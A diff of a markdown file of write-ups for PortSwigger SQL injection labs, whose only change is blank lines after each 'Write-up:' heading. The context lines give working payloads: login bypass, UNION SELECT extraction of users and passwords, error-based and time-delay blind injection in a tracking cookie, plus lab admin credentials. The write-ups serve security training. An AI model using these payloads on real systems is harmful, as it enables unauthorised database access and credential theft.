@@ -2,18 +2,21 @@
 [SQLi vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)
 
 Write-up:
+
 1. `https://0a8200540493743e8242621b00b100be.web-security-academy.net/filter?category=Gifts'+OR+1=1--`
 
 ## SQLi vulnerability allowing login bypass
 [SQLi vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
 
 Write-up:
+
 1. Submitting `administrator'--` as username successfully bypasses password check and solves lab.
 
 ## SQLi with filter bypass via XML encoding
 [SQLi with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
 
 Write-up:
+
 1. We are told we can use a UNION attack in the "Check Stock" feature. This is the
 relevant request: <br>
 
@@ -67,6 +70,7 @@ relevant request: <br>
 [SQLi - querying database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)
 
 Write-up:
+
 1. We are told we can attack the product category filter: `GET /filter?category=Lifestyle HTTP/1.1`
 
 2. We need to determine the number of columns that are being returned by the query: <br>
@@ -83,6 +87,7 @@ Write-up:
 [SQLi - querying database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)
 
 Write-up:
+
 1. We are told we can attack the product category filter: `GET /filter?category=Lifestyle HTTP/1.1`
 
 2. To determine number of columns: `category='ORDER BY 1-- ` - attention to the space at the end.
@@ -94,6 +99,7 @@ We get 2 columns.
 [SQLi - listing database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
 
 Write-up:
+
 1. As in previous labs, we discover the query is returning two columns.
 
 2. `category=' UNION SELECT table_schema,table_name FROM information_schema.tables-- ` shows
@@ -111,6 +117,7 @@ us the admin credentials: `administrator:uiw5gqsuk9mlvk50030s`.
 [SQLi - listing database contents on Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)
 
 Write-up:
+
 1. As in previous labs, we discover the query is returning two columns.
 
 2. `category=' UNION SELECT table_name,NULL FROM all_tables-- ` shows us there is a 
@@ -128,6 +135,7 @@ us the admin credentials: `administrator:3cwa2brpg1ivqhvirven`.
 [SQLi UNION - determining number of columns returned by query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
 
 Write-up:
+
 1. `category=' UNION SELECT NULL--` returns an error, so we need to add more columns.
 
 2. `category=' UNION SELECT NULL,NULL,NULL--` doesn't return an error, which means
@@ -137,6 +145,7 @@ there are 3 columns. This solves the lab.
 [SQLi UNION - findind a column containing text](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)
 
 Write-up:
+
 1. We first assert there are 3 columns, as in previous labs.
 
 2. Using `category=' UNION SELECT NULL,'94yvfI',NULL--`, we can retrieve '94yvfl' as instructed.
@@ -145,6 +154,7 @@ Write-up:
 [SQLi UNION - retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)
 
 Write-up:
+
 1. `category=' UNION SELECT username,password FROM users-- ` returns admin 
 credentials: `administrator:ylbfnitt115twdhupb5x`.
 
@@ -154,6 +164,7 @@ credentials: `administrator:ylbfnitt115twdhupb5x`.
 [SQLi UNION - retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)
 
 Write-up:
+
 1. `category=' UNION SELECT username,password FROM users-- ` doesn't work. We 
 determine that only second column accepts text.
 
@@ -166,6 +177,7 @@ credentials: `administrator:2nt76d9q9ccptqkn5ghj`
 [Blind SQLi with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
 
 Write-up:
+
 1. When intercepting the "filter by category" request, we see the following: 
 `Cookie: TrackingId=YCtmSKirnj4hzm6p;`
 
@@ -216,6 +228,7 @@ to facilitate this lab following the content in [this page](https://portswigger.
 [Visible error-based SQLi](https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based)
 
 Write-up:
+
 1. The following payload causes an error: `TrackingId=KEDRwKmwOqWdVjO2'` shows us that an 
 error appears: `Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'KEDRwKmwOqWdVjO2''. Expected char`
 
@@ -233,6 +246,7 @@ in the table is `administrator`. We can use a similar query to retrieve the pass
 [Blind SQLi with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays)
 
 Write-up:
+
 1. Attempting `TrackingId=' UNION SELECT SLEEP(10)-- ;` and all the other 
 different database syntaxes didn't work. After further research, i found out i needed to
 use concatenation.
@@ -243,6 +257,7 @@ use concatenation.
 [Blind SQLi with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
 
 Write-up:
+
 1. `TrackingId='||pg_sleep(10)-- ;` works. Now we need to get the password for 
 the `administrator` user.
 
